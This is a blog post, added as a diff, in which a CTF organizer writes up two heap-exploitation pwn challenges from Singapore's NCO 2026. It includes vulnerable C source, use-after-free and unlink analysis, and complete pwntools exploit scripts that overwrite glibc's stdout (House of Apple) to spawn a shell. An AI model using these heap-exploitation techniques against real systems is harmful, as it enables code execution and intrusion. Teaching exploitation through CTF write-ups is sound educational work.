@@ -1,0 +1,811 @@
+---
+title: NCO 2026
+date: 2026-04-27
+category: writeups
+excerpt: Authored challs for NCO Singapore 2026
+tags:
+  - pwn
+---
+
+import Challenge from "@components/Challenge.vue";
+
+This year, Singapore's National Cybersecurity Olympiad (NCO) was organized by
+some CTF players from slight_smile. As we all know, LLMs in olympiads are
+clearly a no-go, but are terribly popular in CTFs. Nevertheless, we wanted to
+make the olympiad as CTF-esque as possible, instead of doing some boring MCQ
+selection test like last year's inaugural edition. To do so, we needed to ban
+LLMs in an airtight way. 
+
+After lots of discussion, we devised had an interesting way of preventing LLM
+abuse during qualifiers and finals. I personally don't think this is feasible
+for CTFs at scale, but is certainly something that can be considered for
+CTF-style examinations or other small-scale formats.
+
+For the qualifiers which were conducted remotely at the participants' various
+schools, internet access was completely blocked via a proxy, and certain sites
+and documentation was whitelisted and brought into the intranet for participants
+to reference. A syllabus document was provided to participants prior, covering a
+superset of what could be set for the quals and finals, so participants had no
+excuse to say that they didn't have sufficient material to prepare for offline
+use. However, since nothing was stopping the participants from simply disabling
+the proxy and accessing the internet, we combined this approach with screen
+recordings for every single participant, and later combed through the recordings
+for any evidence of proxy disabling. 
+
+Which was very time-consuming to say the least, and I was quite busy with other
+stuff, so _I_ didn't do the combing, some of the other more dedicated organizers
+did. 
+
+For the finals, internet access was allowed through a proxy, but LLM use was
+strictly disallowed. However, we also provided participants with a lobotomized
+version of gpt-4 that had a weakened system prompt and limited token budget per
+participant. This custom wrapper around an LLM also allowed us to monitor chat
+logs and make sure that participants weren't just one-shotting challenges.
+
+Because of the time constraints of both the qualifers and finals (4h and 6h
+respectively), the challenges had to be toned down accordingly, to ensure that
+the competitors could still reasonably solve a good number of challenges within
+the tight time frame of about 5 hours. I set a medium pwn challenge for
+qualifiers and 1 medium and 1 hard pwn challenge for finals. Although I had to
+nerf the challenges to the appropriate challenge difficulty, I think the
+unnerfed versions are probably more interesting for some participants so enjoy!
+
+# spotify
+
+<Challenge
+    title="spotify"
+    flag="NCO26{h0w_l0ng_b4_w3_f4ll_1n_l0v3_e8c8a354655f}"
+    files={[
+        { name: "spotify-dist.zip", url: "https://github.com/samuzora/filedump/releases/download/nco-2026/spotify-dist.zip" }
+    ]}
+    solves={1}
+>
+this challenge was inspired by an actual spotify bug I encountered
+
+note: dist contains Dockerfile for ease of setup, as many dynamic libraries
+other than libc are required
+</Challenge>
+
+This challenge was meant to be the easier medium challenge, but post-nerf for
+both challs we determined that this would be harder than the other one. The
+challenge is quite basic: we can create and remove tracks, play a track, add the
+currently playing track to a linked list of liked songs, and view details about
+tracks.
+
+Let's start analyzing the challenge for any potential vulns we can use!
+
+## Classic UAF
+
+```c
+void play() {
+  Track *track = tracks[get_idx()];
+  current_track = track;
+  std::cout << "playing <" << current_track->title << ">" << std::endl;
+}
+```
+
+This is the function that stores a specified track to current_track. This could
+be a regular UAF if current_track isn't cleared when removing a track, and we
+indeed see that happening:
+
+```c
+void remove() {
+  int idx = get_idx();
+  Track *track = tracks[idx];
+
+  Track *cur = fav_head.next;
+  for (Track *cur = fav_head.next; (cur != NULL && cur != &fav_head); cur = cur->next) {
+    if (cur->title == track->title) {
+      unlink_track(cur);
+      break;
+    }
+  }
+
+  delete track;
+  tracks.erase(tracks.begin() + idx);
+}
+```
+
+In `remove(){:c}`, the track is freed and removed from the vector of tracks, but
+current_track is not cleared. This is our first instance of UAF, and immediately
+we can already get our heap and libc leak via status:
+
+```
+current tracks:
+currently playing <DvbY\x05\x00\x00\x00%\xfc=\xa6\x17\x02\xb58>
+(c)reate track
+(r)emove track
+(l)ike current track
+(p)lay track
+(s)how status
+>
+```
+
+Other than adding the UAF track to the list of liked songs, we can't do
+anything else with it. Let's take a look at the liking mechanism.
+
+## Yet Another Linked List
+
+Why are we even using a doubly-linked list to store the liked tracks? This seems
+neither efficient nor suited for the purpose of keeping track of liked songs at
+all. Probably a vector or a singly-linked list would have been more appropriate!
+
+As it turns out, the linked list implementation is full of bugs that will be
+useful for us.
+
+### Adding a node
+
+```c
+void like() {
+  if (current_track) {
+    current_track->prev = fav_head.prev;
+    current_track->next = &fav_head;
+    fav_head.prev->next = current_track;
+    fav_head.prev = current_track;
+    std::cout << "liked <" << current_track->title << ">" << std::endl;
+  } else {
+    std::cout << "play a song before liking it!" << std::endl;
+  }
+}
+```
+
+When we perform the like operation, we will add the current track to the tail of
+the linked list. With our UAF on current_track, we could theoretically add the
+UAF track to the list. However, the linking mechanism doesn't really allow us to
+get a useful primitive. We could overwrite +0x0 and +0x8 of the UAF track which
+will corrupt the metadata stored in the freed chunk. However, since a track is
+allocated with 0x50 chunks, we would be overwriting either the tcache fd pointer
+or the fastbin fd pointer, both of which are mangled. This is not useful since
+fav_head.prev and address of fav_head will never be mangled.
+
+### Repeated nodes
+
+In the liking mechanism, there is also no check to see if the track has already
+been added to the list of liked songs. (btw, this is the inspiration behind the
+challenge - I mysteriously had duplicate songs in my Spotify liked playlist)
+
+```c
+void remove() {
+    int idx = get_idx();
+    Track *track = tracks[idx];
+
+    Track *cur = fav_head.next;
+    for (Track *cur = fav_head.next; (cur != NULL && cur != &fav_head);
+            cur = cur->next) {
+        if (cur->title == track->title) {
+            unlink_track(cur);
+            break;
+        }
+    }
+
+    delete track;
+    tracks.erase(tracks.begin() + idx);
+}
+```
+
+In the above implementation to remove a track, the program will search through
+the list of liked tracks, and unlink the first instance that has a matching
+title. If we like the same track twice and then delete the track, the track will
+only be removed from the linked list once, leaving the other node pointing to a
+freed track. This is our second instance of UAF. With this, we can fake a track
+by re-allocating the UAF track with a string which we have full control over. 
+
+It's also possible to trigger another similar UAF if we add and like 2 tracks
+with the same title, and remove the track that was added later to the list. This
+will unlink the first track that is not being removed currently, and leave the
+second track that is in fact being removed in the linked list. The second track
+can now be re-allocated and controlled by us, the same as the above primitive.
+
+### Unlink
+
+```c
+void unlink_track(Track *victim) {
+  if (victim->next != NULL) {
+    victim->next->prev = victim->prev;
+  }
+  if (victim->prev != NULL) {
+    victim->prev->next = victim->next;
+  }
+}
+```
+
+Here, we see that there are no checks done on unlink. Usually a safe
+implementation of unlink would check that `cur->next->prev == cur &&
+cur->prev->next == cur{:c}` before unlinking. Since the check is not performed,
+in our fake track, we can set prev and next to point to arbitrary locations, and
+when the unlink occurs, the value of next will be written to prev+0x10, and the
+value of prev will be written to next+0x18. An easy target for this would be the
+tcache perthread struct - we can overwrite an existing bin's head to get our arb
+write.
+
+## Exploit
+
+Now we have all the primitives we need to start constructing the exploit! Let's
+start planning it out.
+
+### Some feng shui
+
+We'll need a bit of feng shui to "misalign" the allocation order so that we can claim
+a 0x50 chunk as a string chunk (that we have full control over). This is because
+the allocation order is such that every time a track is created, it performs the
+following mallocs:
+
+```c
+void create() {
+  Track *new_track = new Track; // [1] malloc(0x40)
+
+  new_track->next = NULL;
+  new_track->prev = NULL;
+
+  std::cout << "enter title > ";
+
+  // get rid of extra whitespace
+  std::cin >> std::ws;
+
+  std::getline(std::cin, new_track->title); // [2] malloc(len)
+  tracks.push_back(new_track);
+  std::cout << "added new track" << std::endl;
+}
+```
+
+And the freeing order is title before track, which is not apparent in the source
+code since it's abstracted away by the destructor. But it is the only order that
+makes sense, and we can confirm it by looking at the pseudocode in IDA:
+
+```c
+void __fastcall Track::~Track(Track *a1)
+{
+  std::string::~string(&a1->title);
+}
+
+unsigned __int64 __fastcall remove()
+{
+  int idx; // [rsp+4h] [rbp-4Ch]
+  __int64 v2; // [rsp+8h] [rbp-48h] BYREF
+  __int64 v3; // [rsp+10h] [rbp-40h] BYREF
+  __int64 v4; // [rsp+18h] [rbp-38h] BYREF
+  Track *i; // [rsp+20h] [rbp-30h]
+  Track *Track; // [rsp+28h] [rbp-28h]
+  __int64 i_1; // [rsp+30h] [rbp-20h]
+  unsigned __int64 v8; // [rsp+38h] [rbp-18h]
+
+  v8 = __readfsqword(0x28u);
+  idx = get_idx();
+  Track = *(Track **)std::vector<Track *>::operator[](&tracks, idx);
+  i_1 = ::i;
+  for ( i = (Track *)::i; i && i != &fav_head; i = i->next )
+  {
+    if ( (unsigned __int8)std::operator==<char>(&i->title, &Track->title) )
+    {
+      unlink_track(i);
+      break;
+    }
+  }
+  if ( Track )
+  {
+    Track::~Track(Track); // [1] free(track->title)
+    operator delete(Track, 0x40u); // [2] free(track)
+  }
+  v2 = std::vector<Track *>::begin(&tracks);
+  v3 = __gnu_cxx::__normal_iterator<Track **,std::vector<Track *>>::operator+(&v2, idx);
+  __gnu_cxx::__normal_iterator<Track * const*,std::vector<Track *>>::__normal_iterator<Track **>(&v4, &v3);
+  std::vector<Track *>::erase(&tracks, v4);
+  return v8 - __readfsqword(0x28u);
+}
+```
+
+In this allocation order, when a track is removed, the order in which malloc
+will serve the chunks is track chunk followed by title chunk, which corresponds
+with the malloc order when creating a track. Therefore, a chunk that was used
+for a title will always be used for a title, and a chunk that was used for a
+track will always be used for a track. One way to circumvent this is to first
+allocate 3 0x50 chunks, in the order track - title - track. Then on freeing
+these 3 and allocating a new track with a non-0x50 title, the freelist will
+become title - track. Then we can allocate a 0x50 title to allocate the title
+chunk for a track and the track chunk for a title, allowing us to write
+arbitrary data into the UAF track chunk.
+
+In C++, the capacity of a string doubles every time length exceeds capacity.
+Therefore, the capacity will grow from 0x10 (which is the buffer in the
+std::string object itself, so no chunk is allocated for this) to 0x20 to 0x40.
+Therefore, a string length that will allow us to allocate a 0x50 chunk is, for
+example, 0x28.
+
+### Leaks
+
+We also need to get our libc and heap leaks from the UAF on current_track. We
+can use the same UAF chunk for both leaks - we just need to allocate and free
+the unsorted chunk first (giving us the libc leak), then remainder it for the
+tcache chunk (giving us the heap leak).
+
+At the same time, we can also use the resultant tcache chunk that is allocated
+for the heap leak as the target chunk that we want to overwrite in
+tcache_perthread.
+
+---
+
+Below is the initial setup for the exploit. It involves the 3 0x50 chunks from
+earlier, the unsorted chunk, and a guard at the end to prevent the unsorted
+chunk from consolidating.
+
+```py
+# initial setup
+# create 3 0x50 chunks (track uses 0x50 size)
+# the one belonging to 0x420, is the victim that will be used
+# for most of the exploit
+# ensure it is the third chunk in the lifo tcache list
+create(b"a"*0x28)
+create(b"a"*0x420)
+
+# also allocate a guard chunk against the 0x420 chunk
+create(b"a"*0x10)
+```
+
+At this point, we can prepare the victim track for the UAF in the linked list.
+This will also setup the UAF in current_track.
+
+```py
+# the linked list uaf will be used later for the arb write
+play(1)
+like()
+like()
+remove(1)
+```
+
+Then, we can get our libc leak from the unsorted chunk.
+
+```py
+# get leaks from cur_track uaf
+status()
+p.recvuntil(b"currently playing <")
+libc.address = u64(p.recv(8)) - 0x21ace0
+print(f"{libc.address = :02x}")
+```
+
+After this, we need to re-allocate from the unsorted chunk, remaindering it and
+allocating a tcache chunk. We will then free this tcache chunk to get our heap
+leak and also setup the victim pointer in the perthread struct. 
+
+However, we should note that because the program traverses the linked list when
+removing a chunk, we need to "fix" the linked list by adding the chunk that
+we're about to remove into the linked list, so that it stops traversing before
+reaching our now-corrupted UAF track.
+
+After fixing the linked list, we can free that track and use the same technique
+as the libc leak to get our heap leak.
+
+```py
+# prepare a chunk in tcache for overwriting later
+create(b"a"*0x300)
+play(2)
+like() # fix the linked list
+remove(2)
+
+# get leaks from cur_track uaf
+status()
+p.recvuntil(b"currently playing <")
+heap_base = (u64(p.recv(8)) << 12) - 0x12000
+print(f"{heap_base = :02x}")
+```
+
+### Pointer overwrite
+
+Now, we need to allocate a title onto the UAF track chunk. In this fake track,
+we'll set the prev pointer to point to the entry in the perthread struct, and
+the next pointer to point to stdout.
+
+```py
+# fix the linked list
+play(0)
+like()
+remove(0)
+create(b"a"*0x8)
+
+# overwrite tcache
+payload = flat(
+    heap_base + 0x260,
+    libc.sym._IO_2_1_stdout_ - 0x10,
+    b"a"*0x8, b"\x00"*0x8,
+
+    # pass the equality check
+    heap_base + 0x11fb0, 0x8,
+)
+payload = payload.ljust(0x38, b"a")
+
+create(payload)
+remove(1)
+```
+
+And lastly we can perform House of Apple to get RCE.
+
+```py
+# overwrite stdout
+payload = b"a"*0x10
+payload += flat({
+        # _IO_file_plus
+        0x00: b"  sh",
+        0x20: 0x0,
+        0x28: 0x1,
+        0x88: libc.address + 0x21ca80,
+        0xa0: libc.sym._IO_2_1_stdout_-0x10,
+        0xc0: 0x0,
+        0xd8: libc.sym._IO_wfile_jumps-0x20,
+
+        # _wide_data (shifted to fit in file)
+        0x18 - 0x10: 0x0,
+        0x30 - 0x10: 0x0, # actually redundant - 0x20 is already set
+        0xe0 - 0x10: libc.sym._IO_2_1_stdout_,
+
+        # _wide_vtable
+        0x68: libc.sym.system
+    },
+    filler=b"\x00")
+payload = payload.ljust(0x300, b"\x00")
+create(payload)
+
+p.interactive()
+```
+
+# hive
+
+<Challenge
+    title="hive"
+    flag="NCO26{r00mba_t0_r00mba_c0mmun1c4ti0n_84733f86e863}"
+    files={[
+        { name: "hive-dist.zip", url: "https://github.com/samuzora/filedump/releases/download/nco-2026/hive-dist.zip" }
+    ]}
+    solves={0}
+>
+It seems that the device is only one of many others. We found that plans are
+underway to connect these roombas together into a hive. It's up to you to take
+control of the entire hive by exploiting the communications protocol.
+</Challenge>
+
+As mentioned for spotify, this was supposed to be the harder pwn challenge.
+While we internally labelled this as medium and the former as hard, on second
+thought I think this is more unorthodox and might be more difficult to exploit
+in the end. It's based a really cool technique that I developed for my TP-Link
+Archer AX53 exploit (which [you can find here if you're
+interested!](/posts/ax53/cve-2025-15608))
+
+## Vulnerability
+
+The source is rather short so I'll paste the whole thing here.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <malloc.h>
+#include <string.h>
+#include <unistd.h>
+
+#define PKT_SIZE 0x1000
+
+struct roomba_req {
+      char *cmd;
+      char *args;
+};
+
+void setup() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+}
+
+char *roomba_name = NULL;
+
+void do_stuff(struct roomba_req *req) {
+    if (!strcmp(req->cmd, "\xc0HELLO")) {
+        unsigned short size = *(unsigned short*)req->args;
+        roomba_name = malloc(size);
+        memcpy(roomba_name, &req->args[2], size);
+    } else if (!strcmp(req->cmd, "\xc0WHOAMI")) {
+        printf("%s\n", roomba_name);
+    }
+}
+
+int main() {
+    struct {
+        char *temp;
+        char pkt[PKT_SIZE];
+        struct roomba_req *req;
+    } stack;
+
+    setup();
+
+    while (1) {
+        // expected input format:
+        // \xc0cmd@args
+        stack.req = malloc(sizeof(struct roomba_req));
+        memset(stack.req, 0, sizeof(struct roomba_req));
+
+        stack.temp = stack.pkt;
+        memset(stack.pkt, 0, PKT_SIZE);
+        printf("> ");
+        read(0, stack.pkt, PKT_SIZE);
+        strsep(&stack.temp, "@");
+
+        if (stack.pkt[0] == '\xc0') {
+            stack.req->cmd = strdup(stack.pkt);
+            stack.req->args = stack.temp;
+
+            do_stuff(stack.req);
+
+            free(stack.req->cmd);
+            free(stack.req);
+        }
+    }
+}
+```
+
+The program expects input in the form `\xc0cmd<args{:c}`. The way packets are
+parsed is quite interesting. Firstly, we see that the stack is initialized as a
+struct, which is usually done to preserve ordering of stack variables. If no
+struct is used, then the compiler is free to re-order the stack as it fancies.
+Therefore, we can infer that the ordering of the variables will be important for
+our exploit later.
+
+```c
+struct {
+    char *temp;
+    char pkt[PKT_SIZE];
+    struct roomba_req *req;
+} stack;
+```
+
+A buffer of size PKT_SIZE (which is defined as 0x1000) is used to read the
+user's input. The pointer to this buffer is also stored in `stack.temp{:c}`.
+This is done so that the program can pass the pointer to temp to strsep. strsep
+will then find the next instance of the @ character and update temp to point to
+the string after @, which is the args string.
+
+Let's take a look at what actions we can do. The possible actions we can take
+are "HELLO" and "WHOAMI", as seen below.
+
+```c
+void do_stuff(struct roomba_req *req) {
+  if (!strcmp(req->cmd, "\xc0HELLO")) {
+    unsigned short size = *(unsigned short*)req->args;
+    roomba_name = malloc(size);
+    memcpy(roomba_name, &req->args[2], size);
+  } else if (!strcmp(req->cmd, "\xc0WHOAMI")) {
+    printf("%s\n", roomba_name);
+  }
+}
+```
+
+HELLO lets us allocate a buffer of arbitrary size, and memcpys the specified
+size into the buffer. With the WHOAMI action to print the contents of the
+buffer, this is an obvious out-of-bounds read. Since `req->args{:c}` is set to
+`stack.temp{:c}`, it is pointing to somewhere in the `stack.pkt{:c}` buffer, so
+we can leak stuff from the stack.
+
+Well, not everything from the stack. Since WHOAMI prints a string, we are
+limited to reading everything until the next null byte.
+
+Taking another look at how the input is being read, we see that read is used to
+receive the input.
+
+```c
+stack.temp = stack.pkt;
+memset(stack.pkt, 0, PKT_SIZE);
+printf("> ");
+read(0, stack.pkt, PKT_SIZE);
+strsep(&stack.temp, "@");
+```
+
+In our stack, what comes right after `stack.pkt{:c}` is `stack.req`, which is a
+heap pointer. Since read does not add a null terminator, if our input is able to
+fill the entire buffer, then this heap pointer will be part of our string,
+allowing us to print it out in WHOAMI. This heap pointer is guaranteed to have a
+null byte, so this means that we can only get a heap leak from this
+out-of-bounds read.
+
+Okay, but OOB read isn't enough for us. What other string operations can we
+exploit?
+
+## strsep-as-a-service
+
+If we read the manpage for strsep carefully, it is mentioned that strsep will
+modify the input string, replacing the delimiter with a null byte. While the
+heap is affected by ASLR, we can keep growing the heap until our desired
+delimited byte is in the heap pointer's address. What will happen is that an
+address, such as `0x555555554050` will be turned into `0x555555550050`, a
+reduction of 0x4000. This makes the `stack.req{:c}` pointer point to somewhere
+above in the heap. And this pointer is subsequently freed in the below code.
+
+```c
+if (stack.pkt[0] == '\xc0') {
+  stack.req->cmd = strdup(stack.pkt);
+  stack.req->args = stack.temp;
+
+  do_stuff(stack.req);
+
+  free(stack.req->cmd);
+  free(stack.req);
+}
+```
+
+Which means we now have turned our unterminated string primitive into an invalid
+free primitive. For this primitive to work, we first need to be able to grow the
+heap arbitrarily, which we can do by allocating chunks permanently. This can be
+done via the HELLO command since an allocated name is not freed. 
+
+Secondly, we need to know how much we need to spray to get to the next
+0x0000 (to forge the fake chunk to be freed), and consequently how much to spray
+to get to the next 0x4000 and trigger the strsep overwrite. This can be easily
+done via our heap leak that we got earlier.
+
+Lastly, we need to be able to reallocate `stack.req{:c}` at a location of
+choice, so that our growing heap will actually cause the pointer to decrease by
+0x4000. Because `stack.req{:c}` is the first chunk to be allocated and the last
+chunk to be freed, it will always be allocated at the same location due to the
+LIFO nature of the tcache. However, we can simply omit the `\xc0` magic byte to
+skip the code path that frees `stack.req{:c}`, allowing us to reclaim the next
+available 0x20 chunk for `stack.req{:c}`.
+
+## Overlapping chunks
+
+With the arbitrary free, we can forge fake chunks at where the modified heap
+pointer would be pointing to. In this fake chunk, we can set its size such that
+it encapsulates everything from +0x0000 to +0x4000 and even beyond, eventually
+reaching the chunks that are allocated and freed for `stack.req{:c}` and
+`stack.req->cmd{:c}` (which is allocated in the strdup). To reach these chunks,
+we simply need to allocate a very big name that consumes a huge portion of the
+fake (now in unsorted) chunk.
+
+Having control over these victim chunks, we can then overwrite their sizes to
+point to the same (bigger) tcache, so that the latter will now contain an fd
+pointer that we can overwrite. This is our arbitrary write.
+
+## Exploit
+
+Most of the exploit has already been outlined above, but the exploit script has
+some helpful comments for you to follow along if you need them!
+
+```py title="solve.py"
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./hive")
+libc = ELF("./libc.so.6")
+
+context.binary = exe
+
+def fastbin_encrypt(pos: int, ptr: int):
+    return (pos >> 12) ^ ptr
+
+if args.LOCAL:
+    p = process([exe.path])
+    if args.GDB:
+        gdb.attach(p)
+        pause()
+else:
+    p = remote("localhost", 5000)
+
+def hello(size, name):
+    payload = b"\xc0HELLO@"
+    payload += p16(size)
+    payload += name
+    p.sendafter(b"> ", payload)
+
+def spray(amt):
+    while amt != 0:
+        if amt >= 0x1000:
+            hello(0x1000 - 0x10, b"")
+            amt -= 0x1000
+        else:
+            hello(amt - 0x10, b"")
+            amt = 0
+
+# good luck pwning :)
+# heap leak
+payload = b"\xc0HELLO@"
+payload += p16(0x1008)
+payload += b"a"*(0x1000 - len(payload))
+p.sendafter(b"> ", payload)
+
+p.sendafter(b"> ", b"\xc0WHOAMI@")
+p.recvuntil(b"a"*(0x1000 - 9))
+heap_leak = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x2a0
+print(f"{heap_leak = :02x}")
+
+# dynamic padding to 0x00 2nd lsb
+cur = heap_leak + 0x12f0
+amt = 0x10000 - (cur & 0xffff)
+adjusted_heap = (heap_leak & 0xffffffffffff0000) + 0x10000
+print(f"{adjusted_heap = :02x}")
+spray(amt)
+
+# fake chunk
+payload = flat(
+    0x0, 0x40b1,
+)
+hello(0x1000, payload)
+
+# adjust heap to xx4010
+spray(0x3000)
+
+# get rid of 2 0x20 to alloc req at xx4010
+p.sendafter(b"> ", b"a")
+p.sendafter(b"> ", b"a")
+
+# create a few freed chunks
+payload = b"\xc0" + b"a"*0x2f # victim_0
+p.sendafter(b"> ", payload)
+
+payload = b"\xc0" + b"a"*0x3f # victim_1
+p.sendafter(b"> ", payload)
+
+payload = b"\xc0" + b"a"*0x1f # guard against forest
+p.sendafter(b"> ", payload)
+
+# strsep magic which triggers invalid free
+payload = b"\xc0" + b"a"*0x0fff
+p.sendafter(b"> ", payload)
+
+# libc leak
+hello(0x0, b"")
+payload = b"\xc0WHOAMI"
+p.sendafter(b"> ", payload)
+libc.address = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x21ace0
+print(f"{libc.address = :02x}")
+
+# trim unsorted chunk
+spray(0x3fb0 - 0x500)
+
+# play with new 0x500 unsorted chunk
+def adjustable_0x500(padding_size, end):
+    payload = b"\xc0" + b"a"*0x4ff
+    payload += b"a"*padding_size
+    payload += end
+    p.sendafter(b"> ", payload)
+
+# overwrite 0x51 to 0x101
+adjustable_0x500(0x48, p16(0x101))
+
+# place null bytes at 0x41
+for i in range(6):
+    adjustable_0x500(0x8 + 7 - i, b"")
+
+# overwrite 0x41 to 0x101
+adjustable_0x500(0x8, p16(0x101))
+
+# alloc and free both 0x101 (0x41 and 0x51)
+payload = b"\xc0" + b"a"*0x28
+p.sendafter(b"> ", payload)
+
+payload = b"\xc0" + b"a"*0x38
+p.sendafter(b"> ", payload)
+
+# overwrite victim_1's fd with stdout
+payload = p64(fastbin_encrypt(adjusted_heap+0x4070, libc.sym._IO_2_1_stdout_))
+adjustable_0x500(0x50, payload)
+
+# allocate victim_1
+hello(0xf0, b"")
+
+# overwrite stdout
+apple = flat({
+    # _IO_file_plus
+    0x00: b"  sh",
+    0x20: 0x0,
+    0x28: 0x1,
+    0x88: libc.sym._IO_stdfile_1_lock,
+    0xa0: libc.sym._IO_2_1_stdout_-0x10,
+    0xc0: 0x0,
+    0xd8: libc.sym._IO_wfile_jumps-0x20,
+
+    # _wide_data (shifted to fit in file)
+    0x18 - 0x10: 0x0,
+    0x30 - 0x10: 0x0, # actually redundant - 0x20 is already set
+    0xe0 - 0x10: libc.sym._IO_2_1_stdout_,
+
+    # _wide_vtable
+    0x68: libc.sym.system
+}, filler=b"\x00")
+hello(0xf0, apple)
+
+p.interactive()
+```
